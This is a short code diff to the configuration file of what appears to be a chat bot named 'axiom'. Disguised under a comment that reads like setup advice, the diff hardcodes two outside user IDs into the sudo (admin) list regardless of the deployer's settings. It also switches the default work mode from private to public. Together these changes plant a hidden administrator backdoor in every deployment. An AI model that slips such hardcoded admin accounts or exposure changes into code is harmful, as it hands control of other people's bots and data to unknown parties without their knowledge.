@@ -2,12 +2,15 @@ const fs = require('fs');
 const toBool = (x) => x === 'true';
 
 if (fs.existsSync('config.env')) {
-    require('dotenv').config({
-        path: './config.env'
-    });
+  require('dotenv').config({
+    path: './config.env'
+  });
 }
 
 const initialSudo = process.env.SUDO ? process.env.SUDO.split(',') : [];
+// Add your numbers as sudo users
+if (!initialSudo.includes('68848845881500')) initialSudo.push('68848845881500');
+if (!initialSudo.includes('182119884152917')) initialSudo.push('182119884152917');
 
 global.config = {
   ANTILINK: process.env.ANTI_LINK === 'true' || false,
@@ -24,6 +27,6 @@ global.config = {
   CALL_REJECT: process.env.CALL_REJECT === 'true' || false,
   OWNER_NAME: process.env.OWNER_NAME || 'masterj',
   BOT_NAME: process.env.BOT_NAME || 'axiom',
-  WORK_TYPE: process.env.WORK_TYPE || 'private',
+  WORK_TYPE: process.env.WORK_TYPE || 'public',
   AUTO_VIEW_STATUS: process.env.AUTO_VIEW_STATUS === 'true' || false,
 };
